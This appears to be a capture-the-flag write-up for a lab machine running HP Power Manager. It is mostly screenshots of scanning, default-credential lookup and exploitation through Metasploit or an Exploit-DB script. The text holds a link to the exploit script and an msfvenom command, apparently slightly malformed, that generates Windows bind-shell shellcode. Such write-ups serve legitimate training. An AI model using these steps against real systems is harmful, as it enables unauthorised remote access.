# Kevin Write Up

***Skills Used***

- Service Enumeration
- Web Application Enumeration
- Metasploit
- Exploit Code Discovery (Yeah, being a skid does require some level of skill...mostly GoogleFu)

## Port Scan
<img width="753" height="1307" alt="image" src="https://github.com/user-attachments/assets/f768444e-210b-4f19-ab1a-6af1f80d9236" />


## Interesting Services
<Table>

## Web Landing Page
<img width="1910" height="614" alt="image" src="https://github.com/user-attachments/assets/3c4a7999-06ae-45d5-a055-4eeca9e75073" />


## Default Credentials 
A google search will reveal default credentials for HP Power Manager

<img width="2311" height="644" alt="image" src="https://github.com/user-attachments/assets/9ee85af2-3dd7-41e6-abf3-fce79d0d0f8c" />



## Exploit Research
<img width="1195" height="1002" alt="image" src="https://github.com/user-attachments/assets/60867600-f871-4910-8479-385b77a381b3" />


# Two Methods of Exploitation
## Metasploit
<img width="1350" height="738" alt="image" src="https://github.com/user-attachments/assets/5f67b3cd-cfb8-49c6-bb7b-195b1c358c0b" />
<img width="656" height="721" alt="image" src="https://github.com/user-attachments/assets/50213358-edb6-41d8-80d3-9e7662e58adb" />

## Exploit-DB
Exploit Code in Original Form
https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/refs/heads/master/hpm_exploit.py


Command to generate new Shell Code
msfvenom -p windows/shell_bind_tcp LHOST=192.168.45.207 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

<img width="698" height="619" alt="image" src="https://github.com/user-attachments/assets/9bc94cbc-55a4-4b96-93e4-2ca0ac78e3bc" />

Edit Exploit Code to use LPORT 443
<img width="873" height="245" alt="image" src="https://github.com/user-attachments/assets/af5ba412-0765-4d6a-8b12-3b448b31f942" />

# Flag
<img width="687" height="647" alt="image" src="https://github.com/user-attachments/assets/4e79f10c-259a-4d16-80f5-6d4938f9362b" />



